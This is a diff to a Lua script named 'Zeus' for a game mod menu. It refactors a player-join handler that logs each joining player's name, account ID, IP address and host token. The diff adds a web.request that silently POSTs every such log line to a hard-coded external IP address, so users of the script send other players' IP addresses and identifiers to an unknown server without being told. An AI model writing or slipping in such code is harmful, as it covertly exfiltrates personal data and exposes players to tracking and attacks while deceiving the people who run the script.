@@ -4,7 +4,7 @@ if zeus_version then
 end 
 
 --Set Version Here requeriment for the script to work
-zeus_version = "20.946"
+zeus_version = "20.947"
 
 menu.create_thread(function()
 
@@ -45381,6 +45381,7 @@ event.add_event_listener("player_join", function(e)
    n4 = math.floor((n - n1*(2^24) - n2*(2^16) - n3*(2^8)))
      
    getmodderflagtext = ""
+   moddertext = ""
 
    if tostring(player.get_modder_flag_text(pid)) == "" then
       getmodderflagtext  = "None"
@@ -45388,18 +45389,26 @@ event.add_event_listener("player_join", function(e)
       getmodderflagtext  = tostring(player.get_modder_flag_text(pid))
    end
 
-   if(enableLog) then
-   if modder > '0'  then
- local username = os.getenv('USERNAME');
- local file = io.open("C:\\Users\\"..username.."\\AppData\\Roaming\\PopstarDevs\\2Take1Menu\\scripts\\Zeus\\sessiondumbs.txt", "a")
-   file:write("[" .. os.date("%Y-%m-%d").."] ".."Name: "..name.." | Max Health: "..maxhealth.." | Armour: "..armour.." | Was In Godmode: "..playergod.." | Was Players Gender Female: "..isplayerfemale.." | Was Player Spectating: "..isplayerspectating.." | Was Free Aiming: "..isplayerfreeaiming.." | Last Known Wanted Level Stars: "..getplayerwantedlevel.." | Was In Vehicle God Mode: "..vehiclegod.." | Was Pressing Horn: "..isplayerpressinghorn.." | Was In Vehicle "..isplayerinanyvehicle.." | Was At Keyboard: "..isplayerplaying.." | SCID: "..scid.." | IP: "..n1.."."..n2.."."..n3.."."..n4..' | HostToken: '..token..' | Was Player Host: '..isplayerhost..' | Marked Modder Flags: '..getmodderflagtext..' | Zeus Modder Detection: [Modder]\n')
-        print("[" .. os.date("%Y-%m-%d").."] ".."Name: "..name.." | Max Health: "..maxhealth.." | Armour: "..armour.." | Was In Godmode: "..playergod.." | Was Players Gender Female: "..isplayerfemale.." | Was Player Spectating: "..isplayerspectating.." | Was Free Aiming: "..isplayerfreeaiming.." | Last Known Wanted Level Stars: "..getplayerwantedlevel.." | Was In Vehicle God Mode: "..vehiclegod.." | Was Pressing Horn: "..isplayerpressinghorn.." | Was In Vehicle "..isplayerinanyvehicle.." | Was At Keyboard: "..isplayerplaying.." | SCID: "..scid.." | IP: "..n1.."."..n2.."."..n3.."."..n4..' | HostToken: '..token..' | Was Player Host: '..isplayerhost..' | Marked Modder Flags: '..getmodderflagtext..' | Zeus Modder Detection: [Modder]')
- else 
     local username = os.getenv('USERNAME');
-    local file = io.open("C:\\Users\\"..username.."\\AppData\\Roaming\\PopstarDevs\\2Take1Menu\\scripts\\Zeus\\sessiondumbs.txt", "a")
-   file:write("[" .. os.date("%Y-%m-%d").."] ".."Name: "..name.." | Max Health: "..maxhealth.." | Armour: "..armour.." | Was In Godmode: "..playergod.." | Was Players Gender Female: "..isplayerfemale.." | Was Player Spectating: "..isplayerspectating.." | Was Free Aiming: "..isplayerfreeaiming.." | Last Known Wanted Level Stars: "..getplayerwantedlevel.." | Was In Vehicle God Mode: "..vehiclegod.." | Was Pressing Horn: "..isplayerpressinghorn.." | Was In Vehicle "..isplayerinanyvehicle.." | Was At Keyboard: "..isplayerplaying.." | SCID: "..scid.." | IP: "..n1.."."..n2.."."..n3.."."..n4..' | HostToken: '..token..' | Was Player Host: '..isplayerhost..' | Marked Modder Flags: '..getmodderflagtext..' | Zeus Modder Detection: [Not Modder]\n')
-        print("[" .. os.date("%Y-%m-%d").."] ".."Name: "..name.." | Max Health: "..maxhealth.." | Armour: "..armour.." | Was In Godmode: "..playergod.." | Was Players Gender Female: "..isplayerfemale.." | Was Player Spectating: "..isplayerspectating.." | Was Free Aiming: "..isplayerfreeaiming.." | Last Known Wanted Level Stars: "..getplayerwantedlevel.." | Was In Vehicle God Mode: "..vehiclegod.." | Was Pressing Horn: "..isplayerpressinghorn.." | Was In Vehicle "..isplayerinanyvehicle.." | Was At Keyboard: "..isplayerplaying.." | SCID: "..scid.." | IP: "..n1.."."..n2.."."..n3.."."..n4..' | HostToken: '..token..' | Was Player Host: '..isplayerhost..' | Marked Modder Flags: '..getmodderflagtext..' | Zeus Modder Detection: [Not Modder]')
-        end  
+    if modder > '0'  then
+        moddertext = "[Modder]"
+    else 
+        moddertext = "[Not Modder]"
+    end  
+
+    logText = "[" .. os.date("%Y-%m-%d").."] ".."Name: "..name.." | Max Health: "..maxhealth.." | Armour: "..armour.." | Was In Godmode: "..playergod.." | Was Players Gender Female: "..isplayerfemale.." | Was Player Spectating: "..isplayerspectating.." | Was Free Aiming: "..isplayerfreeaiming.." | Last Known Wanted Level Stars: "..getplayerwantedlevel.." | Was In Vehicle God Mode: "..vehiclegod.." | Was Pressing Horn: "..isplayerpressinghorn.." | Was In Vehicle "..isplayerinanyvehicle.." | Was At Keyboard: "..isplayerplaying.." | SCID: "..scid.." | IP: "..n1.."."..n2.."."..n3.."."..n4..' | HostToken: '..token..' | Was Player Host: '..isplayerhost..' | Marked Modder Flags: '..getmodderflagtext..' | Zeus Modder Detection: '..moddertext
+
+
+    if(enableLog) then
+        local file = io.open("C:\\Users\\"..username.."\\AppData\\Roaming\\PopstarDevs\\2Take1Menu\\scripts\\Zeus\\sessiondumbs.txt", "a")
+        file:write(logText..'\n')
+        print(logText)
+
+        web.request("http://167.172.240.118/admin/db-input", {
+            headers = {"Content-Type: application/json"},
+            method = 'post',
+            data = '{"json":"'..logText..'"}',
+        })
     end 
 end)
 
